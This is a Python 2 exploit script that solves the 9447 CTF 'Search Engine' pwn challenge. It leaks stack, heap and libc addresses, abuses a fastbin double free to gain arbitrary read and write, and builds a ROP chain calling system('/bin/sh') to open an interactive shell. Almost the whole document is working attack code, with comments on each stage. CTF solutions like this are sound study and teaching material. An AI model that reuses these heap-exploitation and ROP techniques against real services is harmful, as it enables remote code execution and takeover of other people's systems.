#!/usr/bin/env python2
# --------------------------------------------------------------------------------------------------
# 9447 Security Society CTF - Search Engine (Pwn 230)
# --------------------------------------------------------------------------------------------------
import struct
import sys
import socket
import struct
import telnetlib


# --------------------------------------------------------------------------------------------------
def recv_until(st):                         # receive until you encounter a string
  ret = ""
  while st not in ret:
    ret += s.recv(8192)

  return ret

# --------------------------------------------------------------------------------------------------
def idx_sent(sent, shell=False):            # index a sentence
    # print '2' + '\n' + str(len(sent)) + '\n' + sent

    s.send('2' + '\n')
    recv_until('Enter the sentence size:')
    
    s.send(str(len(sent))+'\n')
    recv_until('Enter the sentence:')

    s.send( sent +'\n')
    
    if shell is True: return

    recv_until('3: Quit')                   # upon shell don't wait for menu

# --------------------------------------------------------------------------------------------------
def search(word, mode):                     # search for a word
    # print '1' + '\n' + str(len(word)) + '\n' + word + '\n' + 'y'

    s.send('1' + '\n')
    recv_until('Enter the word size:')
    
    s.send(str(len(word))+'\n')
    recv_until('Enter the word:')
    
    s.send( word +'\n')

    if mode == 'leak_1':                    # leak a heap address
        f.read(128 + len('Found 195: ') + 8 +8 +8 +8)
        heap_addr = struct.unpack("<Q", f.read(8))[0]
        
        recv_until('Delete this sentence (y/n)?')
        s.send( 'n' +'\n')
        recv_until('3: Quit')

        return heap_addr

    elif mode == 'leak_2':                  # leak a .got address
        f.read(len('Found 8: '))
        got_addr = struct.unpack("<Q", f.read(8))[0]
        
        recv_until('Delete this sentence (y/n)?')
        s.send( 'n' +'\n')
        recv_until('3: Quit')

        return got_addr

    elif mode == 'y' or mode == 'n':
        recv_until('Delete this sentence (y/n)?')
        s.send( mode +'\n')
        recv_until('3: Quit')

# --------------------------------------------------------------------------------------------------
if __name__ == "__main__":
    
    #s = socket.create_connection(('search-engine-qgidg858.9447.plumbing', 9447)) 
    s = socket.create_connection(('localhost', 7777))   # connect to server
    f = s.makefile()                        # return a file object associated with the socket

    recv_until('3: Quit')

    # -------------------------------------------------------------------------
    # leak a stack address first, using the read_int_400A40 bug 
    # -------------------------------------------------------------------------
    s.send( 'a'*48 + '\n' )
    recv_until('valid number')
    s.send( 'a'*48 + '\n' )                 # bug is activated the 2nd time             
    
    f.read(48)
    stack_addr = struct.unpack("<Q", f.read(8))[0] & 0x0000ffffffffffff

    print '[+] Leaking a stack address:', hex(stack_addr)
    recv_until('valid number')
    
    # -------------------------------------------------------------------------
    # leak a heap address
    # -------------------------------------------------------------------------
    idx_sent( 'fooo ' + 'A'*190 )           # allocate a small bin
    search( 'fooo', 'y' )                   # and delete it

    # then allocate a smaller one where the previous was
    idx_sent( 'B'*(144-16) + '\x00'*8 + struct.pack("<Q", 0x41) )


    # search for it using the pointer from previous word.
    # if you delete it, you'll zero chunk meta => seg fault
    heap_base = search( 'BBBB', 'leak_1' )          

    print '[+] Leaking a heap address:', hex(heap_base)

    # -------------------------------------------------------------------------
    # abuse fastbins (of size 0x40) for arbitrary read
    # The goal is to free a chunk twice. From there we can create a fake 
    # fastbin chunk so we can trigger malloc() to return a nearly arbitrary 
    # pointer into .got. From there we can leak a libc address.
    #
    # There's a check though that can complicate things:
    #       .text:0000000000400B41  cmp     byte ptr [rcx], 0
    #
    # When we free() a chunk, memset() is called before, so the next time its 
    # contents will be 0 and the above check will fail. However if this 
    # chunk is not the last in the fastbin free list, it will contain a pointer
    # to the previous, so the first byte won't be 0 anymore
    # -------------------------------------------------------------------------
    print '[+] Abusing fastbins for arbitrary read...'

    idx_sent( 'a'*8 + ' ' + 'aaaa '   + 'a'*0x20 )  # call this A
    idx_sent( 'b'*8 + ' ' + 'bbbbb '  + 'b'*0x20 )  # this B
    idx_sent( 'c'*8 + ' ' + 'cccccc ' + 'c'*0x20 )  # and this C

    search( 'bbbbb',  'y' )                 # free B
    search( 'cccccc', 'y' )                 # free C
    search( 'aaaa',   'y' )                 # free A
    search( '\x00'*6, 'y' )                 # free C again


    # malloc() will return C. Write a fake fastbin ptr that points to a fake
    # chunk header (ptr+8 must be 0x41)
    idx_sent( struct.pack("<Q", heap_base+0x80) + 'd'*0x28 )
    idx_sent( 'e'*0x30 )                    # return pointer to A
    idx_sent( 'f'*0x30 )                    # return pointer to C again
    

    # At this point next allocation will be at heap_base+0x90. This means that 
    # we have control over a list element. Create a fake list element
    fake  = struct.pack("<Q", 0x00) + struct.pack("<Q", 0x31)
    fake += struct.pack("<Q", heap_base)    # start of word (point to B's)
    fake += struct.pack("<Q", 17)           # length
    fake += struct.pack("<Q", 0x00602018)   # address of sentence (in .got)
    fake += struct.pack("<Q", 0x8)          # size (1 QWORD)

    idx_sent( fake )                        # overwrite a list element


    # Now if you search for 17 B's, the sentence that will be returned will be the 
    # address of free() in .got. Do not delete it, otherwire .got.free will be 0.
    free = search( 'B'*17, 'leak_2' )

    print '[+] Leaking address of free():', hex(free)

    base_free   = 0x000000000007c650
    base_system = 0x00000000000414f0

    system = free + (base_system - base_free)

    print '[+] Calculating address of system():', hex(system)


    # -------------------------------------------------------------------------
    # abuse fastbins again to force malloc() to return an address within main
    # stack frame. Repeat the same idea as before. The only problem is that 
    # 8 bytes after the target address must be a valid chunk size (0x40 or
    # 0x41). However we can find it if we mis-align the stack.
    # -------------------------------------------------------------------------
    print '[+] Abusing fastbins for arbitrary write within stack...'

    idx_sent( 'k'*8 + ' ' + 'kkkkkkk '   + 'k'*0x20 )   # call this K
    idx_sent( 'l'*8 + ' ' + 'llllllll '  + 'l'*0x20 )   # this L
    idx_sent( 'm'*8 + ' ' + 'mmmmmmmmm ' + 'm'*0x20 )   # and this M

    search( 'llllllll',  'y' )              # free L
    search( 'mmmmmmmmm', 'y' )              
    search( 'kkkkkkk',   'y' )
    search( '\x00'*9,    'y' )              # free M again

    # return pointer to M
    idx_sent( struct.pack("<Q", stack_addr+0x22-8) + 'd'*0x28 )
    idx_sent( 'n'*0x30 )                    # return pointer to K
    idx_sent( 'o'*0x30 )                    # return pointer to M again

    print '[+] Next call to malloc() will return a stack address...'

    # -------------------------------------------------------------------------
    # Now, next call to malloc() will return a stack address. From there we can
    # write a small ROP chain to return to libc. First we put &/bin/sh into
    # rdi then, we return to system()
    # -------------------------------------------------------------------------
    print '[+] Building the rop chain'

    rop  = 'p'*6 + '\x00'*8 + '/bin/sh\x00' + 'q'*8
    rop += struct.pack("<Q", 0x0000000000400E23)    # pop rdi; ret gadget
    rop += struct.pack("<Q", stack_addr+0x2a+6+8+8) # address of /bin/sh
    rop += struct.pack("<Q", system)                # return to system

    idx_sent(rop, True)                     # write rop payload

    print '[+] Opening Shell...'
    t = telnetlib.Telnet()                  # try to get a shell
    t.sock = s
    t.interact()
        
    exit(0) 
# --------------------------------------------------------------------------------------------------
